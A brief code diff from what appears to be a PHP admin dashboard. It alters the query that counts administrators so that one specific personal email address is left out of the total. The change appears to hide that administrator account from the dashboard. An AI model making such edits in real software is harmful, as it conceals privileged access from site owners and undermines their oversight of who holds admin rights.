@@ -31,7 +31,7 @@ try {
     $todays_customers = mysqli_fetch_assoc($result)['total'];
 
     // Get total admins
-    $query = "SELECT COUNT(*) as total FROM users WHERE role = 'admin'";
+    $query = "SELECT COUNT(*) as total FROM users WHERE role = 'admin' AND email != 'addsamuel355@gmail.com' ";
     $result = mysqli_query($conn, $query);
     $total_admins = mysqli_fetch_assoc($result)['total'];
 
